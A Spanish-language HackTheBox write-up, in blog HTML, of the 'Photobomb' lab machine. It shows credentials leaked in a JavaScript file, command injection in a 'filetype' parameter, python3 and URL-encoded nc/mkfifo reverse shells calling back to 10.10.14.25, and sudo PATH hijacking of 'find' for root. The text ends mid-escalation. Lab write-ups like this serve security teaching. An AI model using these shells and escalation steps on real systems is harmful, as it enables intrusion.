      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/favicons/avatar.ico" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">H4ckerLite | Blog</a>
    </div>
    <div class="site-subtitle font-italic">WriteUps, Pentesting</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORÍAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/H4ckerLite" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/mortzelo" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>Photobomb WriteUp</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>Photobomb WriteUp</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1675440000"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-02-03
</em>

    </span>

    <!-- lastmod date -->
    
    <span>
      Actualizado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1679867863"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-03-26
</em>

    </span>
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="../../assets/img/commons/photoBomb-writeup/Photobomb.png" class="preview-img bg"
        alt="Photobomb WriteUp"

      

       data-proofer-ignore>

      
        <figcaption class="text-center pt-2 pb-2">Photobomb WriteUp</figcaption>
      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
        H4ckerLite
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1090 palabras">
  <em>6 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Hoy tocará explotar la máquina <strong>Photobomb</strong> de <a href="https://app.hackthebox.com/machines/photobomb">HackTheBox</a>, es de dificultad fácil. Haremos un <code class="language-plaintext highlighter-rouge">command injection</code> y para la escalada haremos un <code class="language-plaintext highlighter-rouge">Path Hijacking</code></p>

<h2 id="escaneo-nmap"><span class="mr-2">Escaneo NMAP</span><a href="#escaneo-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.182 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-02-04 13:24 <span class="nt">-04</span>
Initiating SYN Stealth Scan at 13:24
Scanning 10.10.11.182 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.11.182
Discovered open port 22/tcp on 10.10.11.182
Completed SYN Stealth Scan at 13:24, 17.92s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.182
Host is up, received user-set <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2023-02-04 13:24:12 <span class="nt">-04</span> <span class="k">for </span>18s
Not shown: 61907 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 3626 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>18.08 seconds
           Raw packets sent: 87248 <span class="o">(</span>3.839MB<span class="o">)</span> | Rcvd: 67894 <span class="o">(</span>2.716MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.10.11.182       photobomb.htb"</span> | <span class="nb">tee</span> <span class="nt">-a</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Vemos una pagina de inicio con un redirect a <code class="language-plaintext highlighter-rouge">/printer</code></p>

<p><img data-src="/assets/img/commons/photoBomb-writeup/main.png" alt="WebSite" class="center-image" data-proofer-ignore>
 <em>Web Site</em></p>

<p>Si intentamos acceder nos pedirá credenciales</p>

<p><img data-src="/assets/img/commons/photoBomb-writeup/login.png" alt="login" class="center-image" data-proofer-ignore>
 <em>Log in</em></p>

<p>Podemos probar credenciales típicas por defecto, pero no resultará útil.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>admin:admin
admin:password
admin:pass
guest:guest

</pre></td></tr></tbody></table></code></div></div>
<p>Si revisamos el código fuente nos encontramos con cosaas interesantes.</p>

<p>Le aplicamos un <strong>curl</strong>.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET http://photobomb.htb
&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>
  &lt;title&gt;Photobomb&lt;/title&gt;
  &lt;<span class="nb">link type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"styles.css"</span> <span class="nv">media</span><span class="o">=</span><span class="s2">"all"</span> /&gt;
  &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"photobomb.js"</span><span class="o">&gt;</span>&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
    &lt;header&gt;
      &lt;h1&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/"</span><span class="o">&gt;</span>Photobomb&lt;/a&gt;&lt;/h1&gt;
    &lt;/header&gt;
    &lt;article&gt;
      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;
      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;
      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;
      &lt;p&gt;To get started, please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/printer"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"creds"</span><span class="o">&gt;</span>click here!&lt;/a&gt; <span class="o">(</span>the credentials are <span class="k">in </span>your welcome pack<span class="o">)</span>.&lt;/p&gt;
      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;
    &lt;/article&gt;
  &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></td></tr></tbody></table></code></div></div>
<p>Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET http://photobomb.htb/photobomb.js
<span class="k">function </span>init<span class="o">()</span> <span class="o">{</span>
  // Jameson: pre-populate creds <span class="k">for </span>tech support as they keep forgetting them and emailing me
  <span class="k">if</span> <span class="o">(</span>document.cookie.match<span class="o">(</span>/^<span class="o">(</span>.<span class="k">*</span><span class="p">;</span><span class="o">)</span>?<span class="se">\s</span><span class="k">*</span>isPhotoBombTechSupport<span class="se">\s</span><span class="k">*</span><span class="o">=</span><span class="se">\s</span><span class="k">*</span><span class="o">[</span>^<span class="p">;</span><span class="o">]</span>+<span class="o">(</span>.<span class="k">*</span><span class="o">)</span>?<span class="nv">$/</span><span class="o">))</span> <span class="o">{</span>
    document.getElementsByClassName<span class="o">(</span><span class="s1">'creds'</span><span class="o">)[</span>0].setAttribute<span class="o">(</span><span class="s1">'href'</span>,<span class="s1">'http://pH0t0:b0Mb!@photobomb.htb/printer'</span><span class="o">)</span><span class="p">;</span>
  <span class="o">}</span>
<span class="o">}</span>
window.onload <span class="o">=</span> init<span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Al copiar dicha cookie, podemos ver el panel <code class="language-plaintext highlighter-rouge">/printer</code>.</p>

<p><img data-src="/assets/img/commons/photoBomb-writeup/confirm.png" alt="login" class="center-image" data-proofer-ignore>
<em>Log in</em></p>

<h2 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>En este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser:</p>
<blockquote>
  <p>Cambiarle la extensión y modicar el tamaño.</p>
</blockquote>

<p><img data-src="/assets/img/commons/photoBomb-writeup/printer.png" alt="printer" class="center-image" data-proofer-ignore>
<em>Printer</em></p>

<p>Podemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todo</p>

<p><img data-src="/assets/img/commons/photoBomb-writeup/burp.png" alt="Burp" class="center-image" data-proofer-ignore>
<em>BurpSuite</em></p>

<p>Podemos ver si es vulnerable a un <strong>Command injection</strong>, pero antes que nada inicia un servidor con <code class="language-plaintext highlighter-rouge">python</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python <span class="nt">-m</span> http.server 80
</pre></td></tr></tbody></table></code></div></div>
<p>Mandamos la petición al <code class="language-plaintext highlighter-rouge">Repeater</code>, para ello presionamos <code class="language-plaintext highlighter-rouge">Ctrl + R</code>
Si nos fijamos en los parametros podemos agregar <code class="language-plaintext highlighter-rouge">;</code> y añadir nuestro comando, se vería así</p>

<p><img data-src="/assets/img/commons/photoBomb-writeup/burp1.png" alt="BurpSuite" class="center-image" data-proofer-ignore>
<em>BurpSuite</em></p>

<p>Podemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro <code class="language-plaintext highlighter-rouge">filetype</code> es vulnerable, lo podemos comprobar en la petición</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ python <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.182 - - <span class="o">[</span>04/Feb/2023 14:45:12] <span class="s2">"GET / HTTP/1.1"</span> 200 -
</pre></td></tr></tbody></table></code></div></div>
<p>Podemos intentar enviarnos una reverse shell, usano esta <a href="https://www.revshells.com/">página</a> podemos hacer la reverse shell con varias opciones.
Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shell</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s">"10.10.14.25"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">444</span><span class="p">;</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'</span>
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/commons/photoBomb-writeup/burp2.png" alt="RCE" class="center-image" data-proofer-ignore>
<em>RCE</em></p>

<blockquote>
  <p>Nota: Si usas nc mkfifo y url encode te lanzará la shell igual</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">rm</span>%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2Ff
</pre></td></tr></tbody></table></code></div></div>

<p>Ganamos acceso a la máquina, estamos listos para rootearla</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-lvnp</span> 444
listening on <span class="o">[</span>any] 444 ...
connect to <span class="o">[</span>10.10.14.25] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.182] 49946
wizard@photobomb:~/photobomb<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Toca realizar un tratamiento a la tty, te puedes guiar de mi <a href="https://h4ckerlite.github.io/posts/tty">blog</a>.</p>

<p>Una vez adentro podemos leer la primera flag</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">cat</span> ../user.txt 
06<span class="k">****************************</span>78
wizard@photobomb:~/photobomb<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Si vemos los privilegios <strong>SUDOERS</strong> vemos que podemos ejecutar un programa hecho en <strong>bash</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>wizard on photobomb:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User wizard may run the following commands on photobomb:
    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb<span class="nv">$ </span>

</pre></td></tr></tbody></table></code></div></div>
<p>Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como <strong>sudo</strong> sera ejecutado de forma temporal como root sin proporcionar contraseña</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">sudo</span> /opt/cleanup.sh 
wizard@photobomb:~/photobomb<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">cat</span> /opt/cleanup.sh 
<span class="c">#!/bin/bash</span>
<span class="nb">.</span> /opt/.bashrc
<span class="nb">cd</span> /home/wizard/photobomb

<span class="c"># clean up log files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
<span class="k">then</span>
  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
<span class="k">fi</span>

<span class="c"># protect the priceless originals</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
wizard@photobomb:~/photobomb<span class="nv">$ </span>

</pre></td></tr></tbody></table></code></div></div>
<p>Vemos que el binario <code class="language-plaintext highlighter-rouge">find</code> esta con ruta relativa no absoluta y esto puede derivar a un <strong>Path Hijacking</strong>,</p>

<p>Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">echo </span>bash <span class="o">&gt;</span> find
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 find 
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PWD</span>:<span class="nv">$PATH</span> /opt/cleanup.sh
